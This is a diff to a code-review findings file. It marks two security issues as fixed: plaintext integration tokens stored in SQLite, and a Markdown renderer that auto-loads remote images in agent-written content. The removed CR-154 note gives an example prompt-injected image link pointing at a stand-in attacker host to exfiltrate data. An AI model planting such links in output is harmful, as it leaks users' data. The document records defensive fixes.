@@ -3275,9 +3275,9 @@ Original findings, verbatim:
 
 ### CR-117 [Medium] Integration secrets stored in plaintext SQLite and read directly by integrations, bypassing `lib/config.ts`
 
-- **Status at `abaa007`:** **Open**, fix in [Task 61](review-tasks/61-security-secrets-at-rest-and-rendering.md)
-- **Current location:** lib/db/schema.sql:183-200, lib/db/schema.sql:202, lib/integrations/cursor/credentials.ts:9-16, lib/integrations/gitlab/client.ts:182-184, lib/integrations/jira/service.ts:27-29
-- **Re-verification note:** GitLab PATs, Jira tokens and `settings.cursor.api_key` are still plaintext, read directly from `db` by each integration, and `SELECT *` instance listing still pulls tokens into every routing call. Fix: add a `SecretStore`, the only reader of token columns, encrypting at rest with a key from `lib/config.ts`, and project tokens out of list queries. This is an owner design decision.
+- **Status at `abaa007`:** **Fixed** ([Task 61](review-tasks/61-security-secrets-at-rest-and-rendering.md))
+- **Current location:** lib/db/integration-secret-store.ts, lib/db/at-rest-cipher.ts, lib/db/stores/gitlab-instance-store.ts, lib/db/stores/jira-instance-store.ts, lib/integrations/cursor/credentials.ts, lib/config.ts (`DEVFLOW_SECRETS_KEY`)
+- **Re-verification note:** GitLab/Jira tokens, Cursor API key, and flow `secrets` map values are sealed at rest (migration 6). Instance listing uses projected queries; tokens are read only via `IntegrationSecretStore` / per-id `readToken`.
 
 - **Severity:** Medium
 - **Category:** Boundaries
@@ -4162,9 +4162,9 @@ Original findings, verbatim:
 
 ### CR-154 [Medium] Shared `Markdown` loads remote images from any origin in agent-authored content (exfiltration vector)
 
-- **Status at `abaa007`:** **Open**, fix in [Task 61](review-tasks/61-security-secrets-at-rest-and-rendering.md)
-- **Current location:** components/shared/Markdown.tsx:136-150
-- **Re-verification note:** `Markdown` still renders Streamdown with its default rehype pipeline (streamdown ^2.7.1, `harden` with `allowedImagePrefixes: ["*"]`) over agent, plan and MR content. A prompt-injected `![](https://attacker/?d=...)` is fetched automatically on render. Fix: pass explicit `rehypePlugins` that keep sanitize and configure `harden` with an image allowlist (or none) and `allowedProtocols: ["https","mailto"]`, or override `components.img` with a click-to-load placeholder.
+- **Status at `abaa007`:** **Fixed** ([Task 61](review-tasks/61-security-secrets-at-rest-and-rendering.md))
+- **Current location:** components/shared/Markdown.tsx, components/shared/markdownRehypePlugins.ts
+- **Re-verification note:** `Markdown` passes hardened `rehypePlugins` (no remote image prefixes; `https`/`mailto` only) so agent content cannot auto-fetch attacker URLs on render.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -7377,7 +7377,7 @@ One row per finding, at `abaa007`.
 | CR-114 | Medium | Bug | Open | [Task 34](review-tasks/34-db-row-safety.md) |
 | CR-115 | Medium | Code quality | Open | [Task 34](review-tasks/34-db-row-safety.md) |
 | CR-116 | Medium | Code quality | Fixed (Task 48) | [Task 48](review-tasks/48-backend-dependency-injection.md) |
-| CR-117 | Medium | Security | Open | [Task 61](review-tasks/61-security-secrets-at-rest-and-rendering.md) |
+| CR-117 | Medium | Security | Fixed | [Task 61](review-tasks/61-security-secrets-at-rest-and-rendering.md) |
 | CR-118 | Medium | Code quality | Fixed (Task 48) | [Task 48](review-tasks/48-backend-dependency-injection.md) |
 | CR-119 | Medium | Bug | Open | [Task 30](review-tasks/30-events-feed.md) |
 | CR-120 | Medium | Gap | Fixed | [Task 13](review-tasks/13-frontend-query-ownership.md) |
@@ -7414,7 +7414,7 @@ One row per finding, at `abaa007`.
 | CR-151 | Medium | Bug | Open | [Task 41](review-tasks/41-settings-data-and-errors.md) |
 | CR-152 | Medium | Bug | Open | [Task 41](review-tasks/41-settings-data-and-errors.md) |
 | CR-153 | Medium | Bug | Fixed | Task 43 |
-| CR-154 | Medium | Security | Open | [Task 61](review-tasks/61-security-secrets-at-rest-and-rendering.md) |
+| CR-154 | Medium | Security | Fixed | [Task 61](review-tasks/61-security-secrets-at-rest-and-rendering.md) |
 | CR-155 | Medium | Code quality | Open | [Task 55](review-tasks/55-frontend-constants-and-types.md) |
 | CR-156 | Medium | Accessibility | Open | [Task 52](review-tasks/52-shared-ui-components.md) |
 | CR-157 | Medium | Infra | Fixed | [Task 06](review-tasks/06-db-path-and-seed-safety.md) |
